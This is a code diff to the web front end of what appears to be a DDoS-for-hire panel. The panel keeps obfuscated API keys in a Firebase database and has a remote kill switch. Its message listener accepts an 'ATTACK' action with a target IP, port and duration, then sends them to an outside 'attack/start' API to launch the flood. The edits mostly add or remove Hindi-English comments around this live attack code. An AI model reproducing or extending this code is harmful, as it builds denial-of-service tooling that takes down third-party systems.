@@ -121,10 +121,8 @@
     </div>
 
     <script>
-        // Yahan apna Firebase DB URL daalo (bina https:// ke bhi chalega, par https better hai)
         const CLOUD_DB_URL = "https://kkhg5hh5-default-rtdb.firebaseio.com/";
         
-        // Encryption for API Keys (Base64 + XOR)
         const SECRET_SALT = "VeilSecure2024"; 
         function encryptKey(key) {
             if (!key) return "";
@@ -154,7 +152,7 @@
                 document.getElementById('loginBox').classList.add('hidden');
                 document.getElementById('mainPanel').classList.remove('hidden');
                 loadApiUrl();
-                loadApis();
+                loadApis(); // Ye function app se save ki hui API load karega
                 fetchKillStatus();
                 fetchKeys();
                 fetchNotification();
@@ -203,6 +201,7 @@
             }
         }
 
+        // --- LOAD APIs (Ye fix kiya gaya hai) ---
         async function loadApis() {
             try {
                 const res = await fetch(`${CLOUD_DB_URL}settings/config.json`);
@@ -213,6 +212,8 @@
                     for(let i=1; i<=10; i++) {
                         const encryptedVal = data[`api_key_${i}`] || "";
                         const decryptedVal = decryptKey(encryptedVal);
+                        
+                        // Ye line slot me key ko fill karti hai
                         document.getElementById(`apiKey${i}`).value = decryptedVal;
                         
                         if(decryptedVal.trim() !== "") {
@@ -227,7 +228,7 @@
             } catch(e) {}
         }
 
-        // --- TEST API LOGIC (Direct XMLHttpRequest Bypass) ---
+        // --- TEST API LOGIC ---
         function sendTestRequest(url) {
             return new Promise((resolve) => {
                 const xhr = new XMLHttpRequest();
@@ -237,7 +238,6 @@
                         if (xhr.status === 200) {
                             resolve({ success: true, message: xhr.responseText });
                         } else if (xhr.status === 0) {
-                            // CORS blocked but request went through
                             resolve({ success: true, message: "Request sent (Response blocked by CORS)" });
                         } else {
                             resolve({ success: false, message: xhr.responseText || "Error Code: " + xhr.status });
@@ -390,18 +390,16 @@
             }
         }
 
-        // --- APP COMMUNICATION LOGIC (Receives attack request from App) ---
+        // --- APP COMMUNICATION LOGIC ---
         window.addEventListener("message", async function(event) {
             if (event.data && event.data.action === "ATTACK") {
                 const { ip, port, duration } = event.data;
                 
                 try {
-                    // 1. Get API URL
                     const configRes = await fetch(`${CLOUD_DB_URL}settings/config.json`);
                     const configData = await configRes.json();
                     const baseUrl = configData.api_url || "https://delvorn.vynqo.in/api/attack/start";
                     
-                    // 2. Get first valid API Key
                     let apiKey = "";
                     if (configData) {
                         for(let i=1; i<=10; i++) {
@@ -418,7 +416,6 @@
                         return;
                     }
 
-                    // 3. Send Attack via XMLHttpRequest
                     const targetUrl = `${baseUrl}?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
                     const result = await sendTestRequest(targetUrl);
                     
